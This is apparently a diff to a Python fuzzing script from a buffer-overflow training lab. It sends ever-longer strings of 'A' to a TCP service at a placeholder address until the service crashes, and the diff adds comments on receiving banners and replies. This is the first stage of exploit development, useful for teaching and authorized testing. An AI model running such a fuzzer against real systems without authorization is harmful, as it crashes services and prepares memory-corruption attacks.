@@ -5,26 +5,38 @@
 
 import socket, time, sys
 
-ip = "MACHINE_IP"
+IP = "MACHINE_IP"
 
-port = PORT
-timeout = 5
-prefix = "OVERFLOW1 "
+PORT = PORT
+TIMEOUT = 5
+PREFIX = "OVERFLOW1 "
 
-string = prefix + "A" * 100
+PAYLOAD_STRING = PREFIX + "A" * 100
 
 while True:
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(timeout)
-            s.connect((ip, port))
+            s.settimeout(TIMEOUT)
+            s.connect((IP, PORT))
+
+            # if there is banner being received;
+            # check with nc to confirm;
+            # remove if not needed
             s.recv(1024)
-            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
-            s.send(bytes(string, "latin-1"))
+
+            # sending payload here.
+            print("Fuzzing with {} bytes".format(len(PAYLOAD_STRING) - len(PREFIX)))
+            s.send(bytes(PAYLOAD_STRING, "latin-1"))
+            # s.send((PAYLOAD_STRING.encode()))
+
+            # if there is reply after sending payload;
+            # check with nc to confirm;
+            # remove if not needed
             s.recv(1024)
     except:
-        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+        print("Fuzzing crashed at {} bytes".format(len(PAYLOAD_STRING) - len(PREFIX)))
         sys.exit(0)
-    string += 100 * "A"
+
+    PAYLOAD_STRING += 100 * "A"
     time.sleep(1)
 ```
